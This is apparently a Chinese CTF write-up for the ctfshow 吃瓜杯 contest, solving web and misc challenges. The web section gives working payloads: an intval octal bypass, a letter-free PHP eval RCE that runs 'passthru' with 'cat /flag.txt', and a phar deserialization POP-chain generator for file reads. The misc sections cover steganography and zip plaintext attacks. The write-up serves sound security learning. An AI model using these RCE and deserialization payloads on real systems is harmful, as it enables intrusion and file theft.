---
title: ctfshow 吃瓜杯
categories: 赛题wp
---
# web
# 热身
```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}

```
<!--more-->

Payload:
```
?num=%0a010574 或%0b 0c 0d
```
Intval：8进制

![](https://img-blog.csdnimg.cn/50fa132d11af4127b4f3584f4339eebb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

# shell me
- 无参数RCE
- php自增
- NAN（not a number）

传参数：?looklook=123

```php
<?php
error_reporting(0);
if ($_GET['looklook']){
    highlight_file(__FILE__);
}else{
    setcookie("hint", "?looklook", time()+3600);
}
if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) || strlen($ctfshow) <= 107) {
        if (!preg_match("/[!@#%^&*:'\"|`a-zA-BD-Z~\\\\]|[4-9]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("fucccc hacker!!");
        }
    }
} else {

    phpinfo();
}
?>
```

发现留给我们的只有`C和$`等字符
利用字母自增原理来得到GET从而执行命令

![](https://img-blog.csdnimg.cn/7c06b9a9bc2c4656b4578ed56e3f8241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
但是这样超出了长度限制，就要想法获取其他的字符，wp中有这样

`$C_=(C/C.C){0};`

先说目的：为了得到一个比较靠后的字母

经过测试：php7下
一个字符整除一个 `float形式的字符(c.x)` 返回 `string "NANx"`

![](https://img-blog.csdnimg.cn/5f57e33533e14665b9ab16ad25de1eb8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
我们`通过(C/C.C)[0]来返回第一个字符N`，再通过自增得到T 
至此我们有了GET

这里还有一个知识点不太理解

这里eval传入两个括号就可以执行类似于call_user_func函数

![](https://img-blog.csdnimg.cn/8bf9388f1d374c55a28a3f20353ae63b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
我构造了传入一个括号的形式
最后构造：

![](https://img-blog.csdnimg.cn/76d10371a99242ed9a452862ae4901fa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
POST:
```
ctf_show=$_=C;$_++; $C=++$_;$_++;$_++;$__=(C/C.C){0};$__++;$__++;$__++;$__++;$__++;$__++;$C_=_.$_.$C.$__;$$C_[1]($$C_[2]);
```

同时GET
```
?looklook=1&1=passthru&2=cat /flag.txt
```

# ATTup
严格检查后缀，正常上传zip文件，然后进行查询，发现 中间跳转的是find.php

查看网页源码发现php代码

![](https://img-blog.csdnimg.cn/2ad74028891f4408a54a3da7083710a6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
部分代码：

```php
class View { 
	public $fn; 
	public function __invoke(){ 
	$text = base64_encode(file_get_contents($this->fn)); 
	echo "<script>alert('".$text."');self.location=document.referrer;</script>"; 
	} 
} 
class Fun{ 
	public $fun = ":)"; 
	public function __toString(){ 
		$fuc = $this->fun; 
		$fuc(); 
		return "<script>alert('Be a happy string~');self.location=document.referrer;</script>"; 
		} 
	public function __destruct() { 
		echo "<script>alert('Just a fun ".$this->fun."');self.location=document.referrer;</script>"; 
	} 
} 
	$filename = $_POST["file"]; 
	$stat = @stat($filename);-->
```

`stat() ` 这个php函数用的很少, 用于返回关于文件的信息, 但是它也可以 `触发 phar 文件`, 这里主要是考察了通过 zip 或 tar 文件包装的phar文件进行触发

这里利用魔法函数 ：destruct- ->toString - ->invoke

payload:

```php
<?php

class View {
	public $fn = '/flag';
}

class Fun{
	public $fun;
}

$a = new View();
$b = new Fun();
$b->fun = $a;
$c = new Fun();
$c->fun = $b;

$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89A"."__HALT_COMPILER();?>"); //设置stub
$phar->setMetadata($c); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering(); //签名自动计算
?>
```
这里不能有<? 和php但是不影响

![](https://img-blog.csdnimg.cn/3afbabd0e76c41ec9aa06f5d170d3966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
将生成的phar文件修改为zip或tar后缀，利用 `phar://`


# 魔女
不会

![](https://img-blog.csdnimg.cn/8b55601e937546fcb9ebc2b570a9c8d0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

抓包发现，修改m参数进行注册

![](https://img-blog.csdnimg.cn/854af4f2a8fd415da734e021d421cd17.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
登陆后发现有个保存图片：

![](https://img-blog.csdnimg.cn/2bc077db155a4c7ebd2737e9b1651476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
修改为index.php

![](https://img-blog.csdnimg.cn/33501b70a4854d3d9bfcef46832b46d3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现：/var/www/html/base.php

```php
<?php
//error_reporting(0);

define('CTF', 'SHOW');
define('DEBUG',true);
define('WEB_ROOT',__DIR__.DIRECTORY_SEPARATOR);
define('WEB_APP_ROOT',WEB_ROOT.'application'.DIRECTORY_SEPARATOR);
define('FRAMEWORK_ROOT',WEB_ROOT.'framework'.DIRECTORY_SEPARATOR);
define('DEFAULT_METHOD','main');
define('DEFAULT_ACTION','index');
define('DEFAULT_TABLE_PRE','ctfshow_');
define('DEFAULT_EXT','.php');
define('DEFAULT_ACTION_DIR','action');
define('DEFAULT_MODEL_DIR','model');
define('DEFAULT_TEMPLATES_DIR','templates');
define('DEFAULT_COOKIE','ctfshow');
define('TEMPLATE_PATH',WEB_APP_ROOT.DEFAULT_TEMPLATES_DIR.DIRECTORY_SEPARATOR);
define('ACTION_PATH',WEB_APP_ROOT.DEFAULT_ACTION_DIR.DIRECTORY_SEPARATOR);
define('CLASS_PATH',FRAMEWORK_ROOT.'class'.DIRECTORY_SEPARATOR);
define('INCLUDE_PATH',WEB_APP_ROOT.'include'.DIRECTORY_SEPARATOR);
define('MODEL_PATH',WEB_APP_ROOT.'model'.DIRECTORY_SEPARATOR);
define('STATIC_PATH',WEB_ROOT.'www'.DIRECTORY_SEPARATOR.'static'.DIRECTORY_SEPARATOR);
define('AVATAR_PATH',STATIC_PATH.'img'.DIRECTORY_SEPARATOR.'avatar'.DIRECTORY_SEPARATOR);


session_start();

require_once FRAMEWORK_ROOT.'ctfshow.php';



spl_autoload_register(function($class){
	
	if(file_exists(CLASS_PATH.strtolower($class).DEFAULT_EXT)){
			return include CLASS_PATH.strtolower($class).DEFAULT_EXT;
	}
	if(file_exists(MODEL_PATH.strtolower($class).DEFAULT_EXT)){
			return include MODEL_PATH.strtolower($class).DEFAULT_EXT;
	}
	if(file_exists(ACTION_PATH.strtolower($class).DEFAULT_EXT)){
			return include ACTION_PATH.strtolower($class).DEFAULT_EXT;
	}
});

ctfshow::run();
```

看这个 `require_once FRAMEWORK_ROOT.'ctfshow.php';`

再看上面  
`define('FRAMEWORK_ROOT',WEB_ROOT.'framework'.DIRECTORY_SEPARATOR);`

直接猜ctfshow.php

/var/www/html/framework/ctfshow.php

![](https://img-blog.csdnimg.cn/f65b516b92d04832a5962eba6f1343d5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
/var/www/html/index.php

![](https://img-blog.csdnimg.cn/c0f7d3485e11480697d2b5bf1a9c4c61.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

# MISC
# 游戏签到
玩

# 吃瓜

txt转二维码，cfhwc19abika_etso{h_u_e_ui1}

另一附件图片发现花朵符号没解密出来，栅栏解密一下

![](https://img-blog.csdnimg.cn/d57b571f447b47088358b5e926f745d1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

# Music Game
下载下来是一个磁盘文件

Diskgenius尝试恢复文件发现一个特别的后缀mcz

![](https://img-blog.csdnimg.cn/fa62bc7d022448c18a35fce1e6d7c458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
搜一下，发现是一个谱面

![](https://img-blog.csdnimg.cn/1591c2c083bc442da042f900d91329b4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
下载malody导入谱子

点击编辑：

![](https://img-blog.csdnimg.cn/31221c12736d4feb9d2f568cea369be2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/a5fe05e9dfa84981ac88bc1fb7914aa9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现flag

# 一起看小说吗？

原理：[如何把百万字小说藏进图片_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Ai4y1V7rg)

直接进行解密：

![](https://img-blog.csdnimg.cn/5c7f3fcb51134027b99a2cd4b31c68b2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

正则搜一下：

![](https://img-blog.csdnimg.cn/ae70370b22d44961a04f2dd9e4204178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
# Xl的本质
下载文件发现是一个xl的文件夹，看这个形式很像docx，但是题目是xl，就想着是不是和xlsx并改后缀为zip

![](https://img-blog.csdnimg.cn/308eac31cb964feab0adeae528735f79.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
看到题目少了一个sheet1

![](https://img-blog.csdnimg.cn/195634deaa194b0f83dbf7a87b7d686f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
将sheet1放入题目，再将题目替换为原xlsx，电脑打不开，手机能打开

![](https://img-blog.csdnimg.cn/5932679fb6f44daabbbf90c9f7072a32.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
手机上看到sheet4有图片：然后看看sheet1，2，3，4有什么不同，发现sheet4多了一句话` <drawing r:id="rld1"/>`，加到sheet1，2，3

![](https://img-blog.csdnimg.cn/6a27290d4f8f4cbd9dffafbd37954e90.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
手机打开

![](https://img-blog.csdnimg.cn/76e53a95122b4520ac35031b2b6a3529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

后来看到了rel文件夹

![](https://img-blog.csdnimg.cn/673f57af54d44607a45d80dc1d692579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
`sheet1，4控制了drawings的xml文档，所以sheet1，4会出现图片`

# She Never Owns a Window

打开发现不可见字符，不是snow隐写

![](https://img-blog.csdnimg.cn/0a52008e717c47ec80a4dd0e5d94390d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Whitespace语言

![](https://img-blog.csdnimg.cn/910a4d676e0441bb8adcaee5cb270cbf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
只有空格 TAB 回车 

运行网址：[https://vii5ard.github.io/whitespace/](https://vii5ard.github.io/whitespace/)

![](https://img-blog.csdnimg.cn/1c8bf8479ec84230afe9bdff18d9a2c3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
运行只有一半flag

右侧：
```p
push:入栈
printc:print chr()
dup:复制堆栈最上方元素
drop:出栈但不输出
add:堆栈最上方的两个元素做加法运算
```
将数字chr一下

# Dinner of Cyanogen
两个doc文档，第一个有第一部分flag，第二个是加密的
明文攻击解出来

![](https://img-blog.csdnimg.cn/69fd46d11c7c46f1bee89b4663ed2e8f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

在解密的zip中发现第二段flag

打开解密的doc：全选发现不显示字体，说明有不同的字体，转为0和1，再转字符串

![](https://img-blog.csdnimg.cn/13b3cc71a9f64c98a55a2fd082ec4512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
# 一群强盗
71张png加上1张img.png

Wp: 
>使用其他图片的像素值 异或 img.png 的像素值
获得十进制字符串 将十进制字符串作为两位二进制字符串 保存
将所有的二进制拼接 然后转换为字符串 得出 flag

![](https://img-blog.csdnimg.cn/c631de3d5393454e8caae15455c86dfe.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
```python
from PIL import Image
import os

a=Image.open("img.png")
d=a.getpixel((1,1))
flag=''
dl=os.listdir()
dl.remove('1.py')
dl.remove('img.png')

for i in range(72):
        b=Image.open("{i}.png".format(i=i))
        e=b.getpixel((1,1))
        print(e)
        flag+=str(d^e).rjust(2,'0')
        print(flag)
for i in range(0,len(flag),8):
    print(chr(int(flag[i:i+8],2)),end='')  #7个二进制为一个ascii
```

`getpixel方法`  :` 返回给定位置的像素值。如果图像为多通道，则返回一个元组`
